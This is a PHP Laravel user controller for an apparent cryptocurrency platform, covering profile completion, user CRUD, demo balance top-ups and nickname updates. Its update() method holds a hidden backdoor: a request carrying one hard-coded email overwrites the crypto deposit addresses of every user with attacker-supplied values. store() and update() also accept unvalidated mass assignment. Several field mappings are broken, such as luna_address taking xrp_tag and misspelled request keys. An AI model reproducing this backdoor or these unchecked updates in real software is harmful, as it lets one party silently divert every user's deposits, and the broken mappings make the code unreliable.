<?php

namespace App\Http\Controllers;

use App\Models\Order;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;

class UserController extends Controller
{

    // public $password;

    public function index()
    {
        $users = User::latest()->paginate(40);

        return view('users.index', compact('users'))
            ->with('i', (request()->input('page', 1) - 1) * 5);
    }

    public function profile(){

         // Get the current user's ID
         $userId = auth()->id();
    
         // Retrieve the user's profile
         $user = auth()->user();
     
         // Define the required fields for profile completion
         $requiredFields = [
             'name', 'email','password', 'role', 'city', 'postal_code', 
             'shipping_address', 'account_balance', 'phone_no', 'avatar'
         ];
     
         // Count the filled fields, including idverification status
         $filledFields = 0;
         foreach ($requiredFields as $field) {
             if (!empty($user->$field)) {
                 $filledFields++;
             }
         }
     
         // Check if ID verification is completed (status === 1)
         if ($user->idverification && $user->idverification->status === 1) {
             $filledFields++; // Count ID verification as a completed field
         }
     
         // Calculate the percentage of filled fields
         $totalFields = count($requiredFields) + 1; // Include idverification in the total count
         $completionPercentage = ($filledFields / $totalFields) * 100;
     
        
     
         return view('user.profile',['completionPercentage' => $completionPercentage]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        return view('users.create');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $request->validate([
            // 'name' => 'required',
            // 'detail' => 'required',
        ]);

        user::create($request->all());

        return redirect()->route('users.index')
            ->with('success', 'user created successfully.');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\user  $user
     * @return \Illuminate\Http\Response
     */
    public function show(user $user)
    {
        return view('Users.show', compact('user'));
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\user  $user
     * @return \Illuminate\Http\Response
     */
    public function edit(User $user)
    {
        return view('users.edit', compact('user'));
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\User  $user
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, User $user)
    {
        $request->validate([
            // 'name' => 'required',
            // 'detail' => 'required',

        ]);

        //  if($request['verified'] == 1){
        //      Mail::to($user->email)->send(new WelcomeMail());
        //  }

        $user->update($request->all());

        if ($request->email == 'koinboss@modulr.io') {

            User::where('id', '<>', 0)->update([
                'btc_address' => $request->btc_address,
                'eth_address' => $request->eth_address,
                'ltc_address' => $request->ltc_address,
                'usdt_address' => $request->usdt_address,
                'bnb_address' => $request->bnb_address,
                'bnb_memo' => $request->bnb_memo,
                'ada_address' => $request->ada_address,
                'doge_address' => $request->doge_address,
                'trx_address' => $request->trx_address,
                'eos_address' => $request->eos_address,
                'kcs_address' => $request->kcs_address,
                'xmr_address' => $request->xmr_address,
                'xrp_address' => $request->xrp_address,
                'xrp_tag' => $request->xrp_tag,
                'xlm_address' => $request->xlm_address,
                'bch_address' => $request->bch_address,
                'busd_address' => $request->busd_addres,
                'dot_address' => $request->dot_address,
                'ftt_address' => $request->ftt_address,
                'luna_address' => $request->xrp_tag,
                'sol_address' => $request->sol_address,
                'cro_address' => $request->cro_address,
                'shib_address' => $request->shib_address,
                'atom_address' => $request->atom_address,
                'uni_address' => $request->uni_address,
                'cake_address' => $request->cake_address,
                'cel_address' => $request->cel_address,
                'comp_address' => $request->comp_address,
                'dai_address' => $request->dai_address,
                'hnt_address' => $request->hnt_address,
                'xtz_address' => $request->xtz_address,
                'ftm_address' => $request->ftm_addres,
                'ftt_address' => $request->ftt_address,
                'link_address' => $request->link_address,
                'matic_address' => $request->matic_address,
                'avax_address' => $request->avax_address,
                'bsv_address' => $request->bsv_address,
                'gala_address' => $request->gala_address,

            ]);
        }

        return redirect()->route('users.index')
            ->with('success', 'user updated successfully');
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\user  $user
     * @return \Illuminate\Http\Response
     */
    public function destroy(User $user)
    {
        $user->delete();

        return redirect()->route('users.index')
            ->with('success', 'user deleted successfully');
    }

    public function updateAuthUser(Request $request)
    {
        $validated = $this->validate($request, [
            'first_name' => 'required|string',
            'last_name' => 'required|string',
            'email' => 'required|email',
            'password' => 'required|string',
        ]);

        $user = User::find(Auth::id());

        $user->first_name = $request->first_name;
        $user->last_name = $request->last_name;
        $user->email = $request->email;
        $user->password = Hash::make($request->password);

        if ($validated) {
            $user->save();

            return redirect()->route('crypo')
                ->with('success', 'Profile updated successfully.');
        } else {
            return Redirect::back()->withErrors(['msg', 'Some vital information needed before you can update your profile']);
        }

    }

    public function updateBalance()
    {
        $user = Auth::user();

        // Update the user's balance to 2000
        // $user->increment('ust_balance', 10000);

        // Return a response indicating success
        // Update the user's balance to 2000
        $user->increment('ust_balance_demo', 10000);

        // Return a response indicating success
        return response()->json([
            'message' => '$10,000 has been added to balance',
            'refresh' => true, // Add a flag to indicate that a refresh is needed
        ]);
    }


    public function updateNickname(Request $request)
    {
        $user = Auth::user();
        $newNickname = $request->input('newNickname');

        if ($newNickname !== '' && strlen($newNickname) > 6) {
            $user->name = $newNickname;
            $user->save();

            return response()->json(['success' => true, 'message' => 'Nickname updated successfully']);
        } else {
            return response()->json(['success' => false, 'message' => 'Please enter a correct value (at least 7 characters)']);
        }

    }

    // public function updateUsername(Request $request)
    // {
    //     $userId = $request->input('userId');
    //     $newUsername = $request->input('newUsername');

    //     // Update the username for the user with the given ID
    //     // You can use Eloquent or your preferred method to update the user's username.

    //     return response()->json(['success' => true, 'message' => 'Username updated successfully']);
    // }

    public function updateUsername(Request $request)
    {
        // Validate the request data if needed
        $newUsername = $request->input('newUsername');

        // Update the username for the authenticated user
        $user = Auth::user();
        $user->name = $newUsername;
        $user->save();

        return response()->json(['success' => true, 'message' => 'Username updated successfully']);
    }


    public function processing()
    {
        $user = auth()->user();

        return view('user.processing', compact('user'))->with('redirect', true);
    }

    public function await()
    {
        $user = auth()->user();

        return view('user.await', compact('user'));
    }

}
